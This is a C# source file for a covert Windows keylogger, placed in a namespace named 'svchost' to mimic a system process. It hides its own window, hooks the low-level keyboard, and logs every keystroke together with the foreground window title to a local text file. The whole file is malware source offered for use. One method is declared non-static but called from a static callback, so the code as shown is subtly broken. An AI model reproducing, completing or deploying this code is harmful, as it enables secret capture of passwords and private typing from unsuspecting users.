using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;

namespace svchost
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide Window
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);

                sw.Write(GetActiveWindowTitle());

                switch ((Keys)vkCode)
                {
                    case Keys.NumPad0:
                        sw.Write("0");
                        break;
                    case Keys.NumPad1:
                        sw.Write("1");
                        break;
                    case Keys.NumPad2:
                        sw.Write("2");
                        break;
                    case Keys.NumPad3:
                        sw.Write("3");
                        break;
                    case Keys.NumPad4:
                        sw.Write("4");
                        break;
                    case Keys.NumPad5:
                        sw.Write("5");
                        break;
                    case Keys.NumPad6:
                        sw.Write("6");
                        break;
                    case Keys.NumPad7:
                        sw.Write("7");
                        break;
                    case Keys.NumPad8:
                        sw.Write("8");
                        break;
                    case Keys.NumPad9:
                        sw.Write("9");
                        break;
                    
                    case Keys.Space:
                        sw.Write(" ");
                        break;

                    case Keys.Enter:
                        sw.Write(Environment.NewLine);
                        break;

                    case Keys.LShiftKey:
                        break;

                    case Keys.RShiftKey:
                        break;

                    case Keys.Down:
                        sw.Write("{DOWN}");
                        break;

                    case Keys.Up:
                        sw.Write("{UP}");
                        break;

                    case Keys.Right:
                        sw.Write("{RIGHT}");
                        break;

                    case Keys.Left:
                        sw.Write("{LEFT}");
                        break;

                    case Keys.CapsLock:
                        sw.Write("{****CAPSLOCK****}");
                        break;

                    case Keys.Delete:
                        sw.Write("{DEL}");
                        break;

                    case Keys.Insert:
                        sw.Write("{INSERT}");
                        break;

                    case Keys.Home:
                        sw.Write("{HOME}");
                        break;

                    case Keys.PageUp:
                        sw.Write("{PAGE UP}");
                        break;

                    case Keys.PageDown:
                        sw.Write("{PAGE DOWN}");
                        break;

                    case Keys.End:
                        sw.Write("{END}");
                        break;

                    case Keys.NumLock:
                        sw.Write("{NUM}");
                        break;

                    case Keys.Divide:
                        sw.Write("/");
                        break;

                    case Keys.Multiply:
                        sw.Write("*");
                        break;

                    case Keys.Oemcomma:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write(",");
                        else
                            sw.Write("<");
                        break;

                    case Keys.OemPeriod:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write(".");
                        else
                            sw.Write(">");
                        break;

                    case Keys.OemQuestion:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("/");
                        else
                            sw.Write("?");
                        break;

                    case Keys.OemSemicolon:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write(";");
                        else
                            sw.Write(":");
                        break;

                    case Keys.Oemtilde:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("`");
                        else
                            sw.Write("~");
                        break;

                    case Keys.OemOpenBrackets:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("[");
                        else
                            sw.Write("{");
                        break;

                    case Keys.OemCloseBrackets:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("]");
                        else
                            sw.Write("}");
                        break;

                    case Keys.Oemplus:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("=");
                        else
                            sw.Write("+");
                        break;

                    case Keys.OemMinus:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("-");
                        else
                            sw.Write("_");
                        break;

                    case Keys.OemPipe:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("\\");
                        else
                            sw.Write("|");
                        break;

                    case Keys.OemQuotes:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write("'");
                        else
                            sw.Write("\"");
                        break;

                    case Keys.LMenu:
                        sw.Write("{ALT}");
                        break;

                    case Keys.RMenu:
                        sw.Write("{ALT}");
                        break;

                    case Keys.LControlKey:
                        sw.Write("{CTRL}");
                        break;

                    case Keys.RControlKey:
                        sw.Write("{CTRL}");
                        break;

                    case Keys.LWin:
                        sw.Write("{WIN}");
                        break;

                    case Keys.RWin:
                        sw.Write("{WIN}");
                        break;

                    case Keys.Tab:
                        sw.Write("    ");
                        break;

                    case Keys.Back:
                        sw.Write("{BCK}");
                        break;

                    default:
                        if (Control.ModifierKeys != Keys.Shift)
                            sw.Write(((char)(Keys)vkCode).ToString().ToLower());//Make these lowercase
                        else
                            switch ((Keys)vkCode)
                            {
                                case Keys.D1:
                                    sw.Write("!");
                                    break;
                                case Keys.D2:
                                    sw.Write("@");
                                    break;
                                case Keys.D3:
                                    sw.Write("#");
                                    break;
                                case Keys.D4:
                                    sw.Write("$");
                                    break;
                                case Keys.D5:
                                    sw.Write("%");
                                    break;
                                case Keys.D6:
                                    sw.Write("^");
                                    break;
                                case Keys.D7:
                                    sw.Write("&");
                                    break;
                                case Keys.D8:
                                    sw.Write("*");
                                    break;
                                case Keys.D9:
                                    sw.Write("(");
                                    break;
                                case Keys.D0:
                                    sw.Write(")");
                                    break;
                                default:
                                    sw.Write((Keys)vkCode);
                                    break;
                            }
                        break;
                }
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        //These Dll's will handle the hooks. Yaaar mateys!

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
